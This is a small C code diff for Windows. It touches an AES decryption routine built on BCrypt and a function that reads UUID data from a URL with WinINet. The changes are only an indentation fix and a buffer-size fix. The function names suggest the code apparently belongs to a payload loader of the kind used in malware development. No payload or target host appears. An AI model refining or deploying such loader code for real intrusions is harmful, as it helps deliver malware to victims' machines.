@@ -52,8 +52,8 @@ BOOL InstallAesDecryption(PAES pAes) {
 	PBYTE				pbPlainText = NULL;
 	DWORD				cbPlainText = NULL,
 
-		// Intializing "hAlgorithm" as AES algorithm Handle
-		STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
+	// Intializing "hAlgorithm" as AES algorithm Handle
+	STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
 	if (!NT_SUCCESS(STATUS)) {
 		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
 		bSTATE = FALSE; goto _EndOfFunc;
@@ -246,7 +246,7 @@ BOOL GetUUIDFromUrl(LPCWSTR szUrl, CHAR* UUID[]) {
     }
 
     for (int i = 0; i < NumberOfElements; i++) {
-        if (!InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
+        if (!InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead)) {
             printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
             InternetCloseHandle(hUrl);
             InternetCloseHandle(hInternet);
